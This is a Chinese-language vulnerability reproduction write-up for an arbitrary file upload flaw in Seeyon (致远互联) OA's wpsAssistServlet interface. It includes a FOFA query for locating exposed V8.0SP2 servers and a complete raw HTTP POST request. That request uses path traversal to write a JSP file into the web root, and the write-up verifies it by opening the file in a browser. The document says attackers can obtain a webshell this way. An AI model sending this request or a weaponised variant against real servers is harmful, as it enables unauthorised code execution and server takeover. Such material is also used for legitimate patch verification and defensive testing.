<a name="DFDZj"></a>
# 一、漏洞背景
```java
2010年用友致远更名为致远协创；2017年更名为致远互联。用友致远协同管理软件精准定位于企事业组织行为管理的需求，融入先进的协同管理理念，运用领先的网络技术，是基于互联网的组织行为管理平台。用友致远协同管理软件为企事业组织提供了一个协同办公门户和管理平台，涵盖了组织运营涉及的协作管理、审批管理、资源管理、知识管理、文化管理、公文管理等内容，支持企事业组织的信息化扩展应用，能有效帮助组织解决战略落地、文化建设、管理规范、资源整合、运营管控等难题，是组织管理的最佳实践。用友致远有A6和A8两大协同软件产品线：A6协同管理软件以其成熟稳定、“易用、好用、适用”的产品特性被业界誉为“协同经典”。2007年底发布的A8协同管理软件，以强力支持集团化、多语言和跨平台应用为特点，被业界誉为“中国协同应用软件的新标准”。致远互联-OA wpsAssistServlet接口存在任意文件上传漏洞，黑客上传恶意文件后可以获取webshell。
```
<a name="NpLPF"></a>
# 二、fofa搜索语法
```java
app="致远互联-OA" && title="V8.0SP2"
```
<a name="TNcUl"></a>
# 三、漏洞复现
第一步，向目标发送如下数据包，其中path中的pajgatzw.jsp为回显文件
```java
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/pajgatzw.jsp&fileId=2 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=oklp586ac9dujytddee11e86fa698nmv

--oklp586ac9dujytddee11e86fa698nmv
Content-Disposition: form-data; name="upload"; filename="majgatzw.xls"
Content-Type: application/vnd.ms-excel

<% out.println("lnrrovkexhsxbzjwptmthmyjgnvgjhjk");%>  
--oklp586ac9dujytddee11e86fa698nmv--
```
![image](https://github.com/testyuo/poc/assets/170853752/0e39a22d-d772-446d-a960-24306d902c31)
<br />第二步，使用浏览器访问回显文件<br />![image.png](https://cdn.nlark.com/yuque/0/2024/png/42988647/1719237788335-3acbf253-4c46-4cf8-8d75-69f75d2b21ce.png#averageHue=%23fdfcfc&clientId=ud521e60a-9dae-4&from=paste&height=245&id=u9b851904&originHeight=306&originWidth=1025&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16834&status=done&style=none&taskId=u094b6502-1e3f-43c6-b7f5-81edc18f79b&title=&width=820)<br />证明存在漏洞








